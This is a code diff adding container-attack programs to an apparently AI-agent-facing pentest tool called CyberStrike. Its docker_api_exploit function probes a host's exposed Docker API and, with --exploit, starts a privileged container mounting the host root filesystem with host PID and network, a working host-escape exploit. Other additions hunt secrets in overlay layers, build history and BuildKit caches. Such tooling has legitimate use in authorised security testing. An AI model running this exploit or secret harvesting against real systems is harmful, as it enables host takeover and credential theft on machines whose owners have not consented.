@@ -32,6 +32,31 @@ const PROGRAMS = {
       "Extract secrets from Docker Compose files, .env files, and container environment variables. Scans for API keys, passwords, tokens, and connection strings",
     args: "[--path DIR]",
   },
+  docker_api_exploit: {
+    description:
+      "Scan for exposed Docker TCP API on ports 2375 (HTTP) and 2376 (TLS). Enumerates containers, images, and version info. Use --exploit to create a privileged breakout container via the API",
+    args: "--target HOST [--port PORT] [--exploit]",
+  },
+  container_network: {
+    description:
+      "Enumerate container network namespaces, bridges, and inter-container connectivity. Lists subnets, gateways, attached containers, and cross-network exposure",
+    args: "[--container ID]",
+  },
+  overlay_inspect: {
+    description:
+      "Inspect Docker overlay2 filesystem layers for deleted secrets, leaked credentials, and leftover config files. Requires root or host filesystem access",
+    args: "[--image IMAGE] [--path DIR]",
+  },
+  podman_enum: {
+    description:
+      "Enumerate Podman containers, pods, images, and volumes. Detects rootless vs rootful mode, security options, and pod networking configuration",
+    args: "[--remote HOST]",
+  },
+  build_cache_dump: {
+    description:
+      "Extract secrets from Docker BuildKit cache and build history. Inspects builder instances, build logs, and cache mounts for leaked credentials",
+    args: "[--builder NAME]",
+  },
   cleanup_container: {
     description:
       "Remove all CyberStrike-created containers, images, volumes, and networks (by label cyberstrike=true). ALWAYS run before leaving",
@@ -703,6 +728,377 @@ async function composeSecrets(args: string[], timeout: number): Promise<HookResu
   return { output: output.join("\n"), findings }
 }
 
+async function dockerApiExploit(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target")
+  const port = argVal(args, "--port")
+  const exploit = hasFlag(args, "--exploit")
+  const findings: Finding[] = []
+  const output: string[] = []
+
+  if (!target) return { output: "[!] Required: --target HOST", findings }
+
+  const ports = port ? [port] : ["2375", "2376"]
+
+  for (const p of ports) {
+    const scheme = p === "2376" ? "https" : "http"
+    const base = `${scheme}://${target}:${p}`
+    output.push(`[*] Probing Docker API at ${base}...\n`)
+
+    const version = await run("curl", ["-sk", "--max-time", "5", `${base}/version`], timeout)
+    if (version.exitCode !== 0 || !version.stdout.includes("ApiVersion")) {
+      output.push(`[-] No Docker API on ${base}`)
+      continue
+    }
+
+    const v = tryJson(version.stdout)
+    output.push(`[+] Docker API EXPOSED at ${base}!`)
+    if (v) {
+      output.push(`    Version: ${v.Version}, API: ${v.ApiVersion}, OS: ${v.Os}/${v.Arch}`)
+      output.push(`    Kernel: ${v.KernelVersion}`)
+    }
+    findings.push({
+      checkId: "CONT-API-001",
+      provider: "docker",
+      severity: "critical",
+      status: "FAIL",
+      resource: `docker://${target}:${p}`,
+      title: `Docker API exposed on ${target}:${p}`,
+      details: `Unauthenticated Docker API — full host takeover possible`,
+      remediation: "Disable TCP socket or enable TLS mutual auth",
+    })
+
+    const containers = await run("curl", ["-sk", "--max-time", "5", `${base}/containers/json?all=true`], timeout)
+    if (containers.exitCode === 0) {
+      const list = tryJson(containers.stdout) || []
+      output.push(`\n[+] Containers: ${list.length}`)
+      for (const c of list.slice(0, 15)) {
+        output.push(`    ${(c.Names || ["/unknown"])[0]} (${c.Image}) — ${c.State}`)
+      }
+    }
+
+    const images = await run("curl", ["-sk", "--max-time", "5", `${base}/images/json`], timeout)
+    if (images.exitCode === 0) {
+      const list = tryJson(images.stdout) || []
+      output.push(`\n[+] Images: ${list.length}`)
+      for (const img of list.slice(0, 10)) {
+        const tags = (img.RepoTags || ["<none>"]).join(", ")
+        output.push(`    ${tags}`)
+      }
+    }
+
+    if (exploit) {
+      output.push(`\n[!] Creating privileged breakout container via API...`)
+      const body = JSON.stringify({
+        Image: "alpine",
+        Cmd: ["/bin/sh", "-c", "sleep 3600"],
+        HostConfig: { Privileged: true, PidMode: "host", NetworkMode: "host", Binds: ["/:/host"] },
+        Labels: { cyberstrike: "true" },
+      })
+      const create = await run(
+        "curl",
+        ["-sk", "-X", "POST", `${base}/containers/create`, "-H", "Content-Type: application/json", "-d", body],
+        timeout,
+      )
+      const created = tryJson(create.stdout)
+      if (created?.Id) {
+        await run("curl", ["-sk", "-X", "POST", `${base}/containers/${created.Id}/start`], timeout)
+        output.push(`[+] Privileged container started: ${created.Id.substring(0, 12)}`)
+        output.push(`    Host filesystem at /host, host PID namespace, host network`)
+        findings.push({
+          checkId: "CONT-API-002",
+          provider: "docker",
+          severity: "critical",
+          status: "EXPLOITED",
+          resource: `docker://${target}:${p}`,
+          title: `Privileged container created via exposed API`,
+          details: `Container ${created.Id.substring(0, 12)} — host escape achieved`,
+          remediation: "Disable unauthenticated Docker API access immediately",
+        })
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function containerNetwork(args: string[], timeout: number): Promise<HookResult> {
+  const container = argVal(args, "--container")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating container network topology...\n"]
+
+  const networks = await run("docker", ["network", "ls", "--format", "json"], timeout)
+  if (networks.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list networks", findings }
+
+  const lines = networks.stdout.trim().split("\n").filter(Boolean)
+  output.push(`[+] Networks: ${lines.length}\n`)
+
+  for (const line of lines) {
+    const net = tryJson(line)
+    if (!net) continue
+    const inspect = await run("docker", ["network", "inspect", net.ID || net.Name], timeout)
+    if (inspect.exitCode !== 0) continue
+    const data = tryJson(inspect.stdout)
+    if (!data?.[0]) continue
+    const n = data[0]
+    const config = n.IPAM?.Config?.[0] || {}
+    output.push(`── ${n.Name} (${n.Driver}) ──`)
+    output.push(`    Subnet: ${config.Subnet || "N/A"}, Gateway: ${config.Gateway || "N/A"}`)
+    output.push(`    Internal: ${n.Internal || false}, Scope: ${n.Scope}`)
+
+    const attached = Object.entries(n.Containers || {})
+    if (attached.length > 0) {
+      output.push(`    Attached containers: ${attached.length}`)
+      for (const [, c] of attached) {
+        const ct = c as Record<string, string>
+        output.push(`      ${ct.Name} — ${ct.IPv4Address || "no IP"}`)
+      }
+    }
+
+    if (!n.Internal && n.Driver === "bridge" && attached.length > 1) {
+      findings.push({
+        checkId: "CONT-NET-001",
+        provider: "docker",
+        severity: "medium",
+        status: "FAIL",
+        resource: `network://${n.Name}`,
+        title: `${attached.length} containers share non-isolated bridge: ${n.Name}`,
+        details: `Containers on bridge "${n.Name}" can communicate freely`,
+        remediation: "Use network segmentation or internal networks for isolation",
+      })
+    }
+    output.push("")
+  }
+
+  if (container) {
+    output.push(`\n[*] Inspecting network config for container: ${container}`)
+    const inspect = await run("docker", ["inspect", "--format", "json", container], timeout)
+    if (inspect.exitCode === 0) {
+      const data = tryJson(inspect.stdout)
+      const nets = data?.[0]?.NetworkSettings?.Networks || {}
+      for (const [name, cfg] of Object.entries(nets)) {
+        const c = cfg as Record<string, string>
+        output.push(`    ${name}: IP=${c.IPAddress}, Gateway=${c.Gateway}, MAC=${c.MacAddress}`)
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function overlayInspect(args: string[], timeout: number): Promise<HookResult> {
+  const image = argVal(args, "--image")
+  const searchPath = argVal(args, "--path") || "/var/lib/docker/overlay2"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Inspecting overlay filesystem layers...\n"]
+
+  const secretPattern =
+    "password\\|secret\\|api[_-]key\\|token\\|credential\\|private[_-]key\\|access[_-]key\\|connection[_-]string"
+
+  if (image) {
+    output.push(`[*] Extracting layers for image: ${image}`)
+    const inspect = await run("docker", ["inspect", image], timeout)
+    if (inspect.exitCode !== 0) return { output: output.join("\n") + `[-] Cannot inspect ${image}`, findings }
+    const data = tryJson(inspect.stdout)
+    const graphDriver = data?.[0]?.GraphDriver?.Data || {}
+    if (graphDriver.UpperDir) {
+      output.push(`    UpperDir: ${graphDriver.UpperDir}`)
+      const grep = await run(
+        "grep",
+        ["-rlI", "--include=*", "-i", secretPattern, graphDriver.UpperDir],
+        timeout,
+      )
+      if (grep.exitCode === 0 && grep.stdout.trim()) {
+        const matches = grep.stdout.trim().split("\n").filter(Boolean)
+        output.push(`    [!] ${matches.length} file(s) with potential secrets:`)
+        for (const m of matches.slice(0, 20)) {
+          output.push(`      ${m}`)
+          findings.push({
+            checkId: "CONT-OVL-001",
+            provider: "docker",
+            severity: "high",
+            status: "FAIL",
+            resource: `overlay://${m}`,
+            title: `Secret in overlay layer: ${m.split("/").pop()}`,
+            details: `Potential credential found in overlay filesystem`,
+            remediation: "Use multi-stage builds and remove secrets before final layer",
+          })
+        }
+      }
+    }
+    if (graphDriver.LowerDir) {
+      const lowers = graphDriver.LowerDir.split(":")
+      output.push(`    LowerDir layers: ${lowers.length}`)
+      for (const lower of lowers.slice(0, 5)) {
+        const grep = await run("grep", ["-rlI", "-i", secretPattern, lower], timeout)
+        if (grep.exitCode === 0 && grep.stdout.trim()) {
+          const matches = grep.stdout.trim().split("\n").filter(Boolean)
+          output.push(`    [!] ${matches.length} secret(s) in layer ${lower.split("/").pop()}`)
+        }
+      }
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  const access = await run("ls", [searchPath], 5)
+  if (access.exitCode !== 0) {
+    output.push(`[-] Cannot access ${searchPath} — need root or host filesystem mount`)
+    return { output: output.join("\n"), findings }
+  }
+
+  const layers = await run("find", [searchPath, "-maxdepth", "2", "-name", "diff", "-type", "d"], timeout)
+  if (layers.exitCode === 0) {
+    const dirs = layers.stdout.trim().split("\n").filter(Boolean)
+    output.push(`[+] Overlay diff layers: ${dirs.length}`)
+    let found = 0
+    for (const dir of dirs.slice(0, 20)) {
+      const grep = await run("grep", ["-rlI", "-i", secretPattern, dir], 10)
+      if (grep.exitCode === 0 && grep.stdout.trim()) {
+        const matches = grep.stdout.trim().split("\n").filter(Boolean)
+        found += matches.length
+        for (const m of matches.slice(0, 5))
+          output.push(`    [!] ${m}`)
+      }
+    }
+    if (found > 0) output.push(`\n[+] Total files with potential secrets: ${found}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function podmanEnum(args: string[], timeout: number): Promise<HookResult> {
+  const remote = argVal(args, "--remote")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating Podman environment...\n"]
+
+  if (!Bun.which("podman")) return { output: "[-] podman not found", findings }
+
+  const extra = remote ? ["--remote", "--url", remote] : []
+
+  const info = await run("podman", [...extra, "info", "--format", "json"], timeout)
+  if (info.exitCode === 0) {
+    const d = tryJson(info.stdout)
+    if (d) {
+      const host = d.host || {}
+      const store = d.store || {}
+      output.push(`[+] Podman ${host.version?.version || "?"}`)
+      output.push(`    Rootless: ${host.security?.rootless || false}`)
+      output.push(`    Runtime: ${host.ociRuntime?.name || "?"}`)
+      output.push(`    OS: ${host.os || "?"} (${host.arch || "?"})`)
+      output.push(`    Containers: ${store.containerStore?.number || 0}`)
+      output.push(`    Images: ${store.imageStore?.number || 0}`)
+      if (host.security?.rootless === false) {
+        findings.push({
+          checkId: "CONT-POD-001",
+          provider: "podman",
+          severity: "medium",
+          status: "INFO",
+          resource: "podman://daemon",
+          title: "Podman running in rootful mode",
+          details: "Rootful Podman has similar risks to Docker daemon",
+          remediation: "Use rootless Podman where possible",
+        })
+      }
+    }
+  }
+
+  const containers = await run("podman", [...extra, "ps", "-a", "--format", "json"], timeout)
+  if (containers.exitCode === 0) {
+    const list = tryJson(containers.stdout) || []
+    output.push(`\n[+] Containers: ${list.length}`)
+    for (const c of list) {
+      const priv = c.IsInfra ? "" : (c.HostConfig?.Privileged ? " [PRIVILEGED]" : "")
+      output.push(`    ${c.Names?.[0] || c.Id?.substring(0, 12)} (${c.Image}) — ${c.State}${priv}`)
+    }
+  }
+
+  const pods = await run("podman", [...extra, "pod", "ls", "--format", "json"], timeout)
+  if (pods.exitCode === 0) {
+    const list = tryJson(pods.stdout) || []
+    if (list.length > 0) {
+      output.push(`\n[+] Pods: ${list.length}`)
+      for (const p of list) {
+        output.push(`    ${p.Name} (${p.Status}) — ${p.NumberOfContainers || 0} containers`)
+      }
+    }
+  }
+
+  const images = await run("podman", [...extra, "images", "--format", "json"], timeout)
+  if (images.exitCode === 0) {
+    const list = tryJson(images.stdout) || []
+    output.push(`\n[+] Images: ${list.length}`)
+    for (const img of list.slice(0, 15)) {
+      const names = (img.Names || img.RepoTags || ["<none>"]).join(", ")
+      output.push(`    ${names} — ${img.Size ? (img.Size / 1024 / 1024).toFixed(1) + "MB" : "?"}`)
+    }
+  }
+
+  const volumes = await run("podman", [...extra, "volume", "ls", "--format", "json"], timeout)
+  if (volumes.exitCode === 0) {
+    const list = tryJson(volumes.stdout) || []
+    if (list.length > 0) {
+      output.push(`\n[+] Volumes: ${list.length}`)
+      for (const v of list) output.push(`    ${v.Name} (${v.Driver})`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function buildCacheDump(args: string[], timeout: number): Promise<HookResult> {
+  const builder = argVal(args, "--builder")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Inspecting Docker build cache and history...\n"]
+
+  const builders = await run("docker", ["buildx", "ls"], timeout)
+  if (builders.exitCode === 0) {
+    output.push(`[+] Build instances:\n${builders.stdout}`)
+  }
+
+  const target = builder || "default"
+  const duCmd = await run("docker", ["buildx", "du", "--builder", target], timeout)
+  if (duCmd.exitCode === 0) {
+    output.push(`\n[+] Cache usage for "${target}":\n${duCmd.stdout.substring(0, 2000)}`)
+  }
+
+  const secretPattern =
+    /(?:password|secret|api[_-]?key|token|credential|private[_-]?key|access[_-]?key|connection[_-]?string)/i
+
+  const images = await run("docker", ["images", "--format", "{{.Repository}}:{{.Tag}}", "--filter", "dangling=false"], timeout)
+  if (images.exitCode === 0) {
+    const imgList = images.stdout.trim().split("\n").filter(Boolean).slice(0, 15)
+    output.push(`\n[*] Scanning build history of ${imgList.length} images...`)
+    for (const img of imgList) {
+      const history = await run("docker", ["history", "--no-trunc", "--format", "{{.CreatedBy}}", img], 10)
+      if (history.exitCode !== 0) continue
+      const cmds = history.stdout.split("\n").filter(Boolean)
+      for (const cmd of cmds) {
+        if (secretPattern.test(cmd)) {
+          output.push(`\n  [!] ${img}:`)
+          output.push(`      ${cmd.substring(0, 200)}`)
+          findings.push({
+            checkId: "CONT-BUILD-001",
+            provider: "docker",
+            severity: "high",
+            status: "FAIL",
+            resource: `image://${img}`,
+            title: `Secret in build history: ${img}`,
+            details: cmd.substring(0, 500),
+            remediation: "Use --mount=type=secret in BuildKit or multi-stage builds",
+          })
+        }
+      }
+    }
+  }
+
+  const buildLogs = await run("find", ["/var/lib/docker/buildkit", "-maxdepth", "2", "-name", "*.json", "-type", "f"], 10)
+  if (buildLogs.exitCode === 0 && buildLogs.stdout.trim()) {
+    const files = buildLogs.stdout.trim().split("\n").filter(Boolean)
+    output.push(`\n[+] BuildKit metadata files: ${files.length}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function cleanupContainer(_args: string[], timeout: number): Promise<HookResult> {
   const dryRun = hasFlag(_args, "--dry-run")
   const findings: Finding[] = []
@@ -758,7 +1154,7 @@ async function cleanupContainer(_args: string[], timeout: number): Promise<HookR
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
 
 export const ContainerhookTool = Tool.define("containerhook", {
-  description: `Execute a container security program for Docker/OCI runtime auditing, image scanning, registry enumeration, and container escape detection. Uses docker CLI (no Python dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_container before leaving.`,
+  description: `Execute a container security program. 12 programs: Docker/OCI runtime audit, image scan, registry dump, escape detection, exposed API exploit, network topology, overlay layer inspection, Podman enum, BuildKit cache dump. Available: ${programKeys.join(", ")}. ALWAYS run cleanup_container before leaving.`,
   parameters: z.object({
     program: z.enum(programKeys).describe(
       "Container program to execute. Options: " +
@@ -770,7 +1166,7 @@ export const ContainerhookTool = Tool.define("containerhook", {
     timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
   }),
   async execute(params) {
-    if (!Bun.which("docker") && !["compose_secrets"].includes(params.program)) {
+    if (!Bun.which("docker") && !["compose_secrets", "docker_api_exploit", "podman_enum"].includes(params.program)) {
       return {
         title: `containerhook: ${params.program}`,
         output: "docker not found. Install: https://docs.docker.com/engine/install/",
@@ -785,6 +1181,11 @@ export const ContainerhookTool = Tool.define("containerhook", {
       registry_dump: () => registryDump(params.args, params.timeout_seconds),
       runtime_audit: () => runtimeAudit(params.args, params.timeout_seconds),
       compose_secrets: () => composeSecrets(params.args, params.timeout_seconds),
+      docker_api_exploit: () => dockerApiExploit(params.args, params.timeout_seconds),
+      container_network: () => containerNetwork(params.args, params.timeout_seconds),
+      overlay_inspect: () => overlayInspect(params.args, params.timeout_seconds),
+      podman_enum: () => podmanEnum(params.args, params.timeout_seconds),
+      build_cache_dump: () => buildCacheDump(params.args, params.timeout_seconds),
       cleanup_container: () => cleanupContainer(params.args, params.timeout_seconds),
     }
 
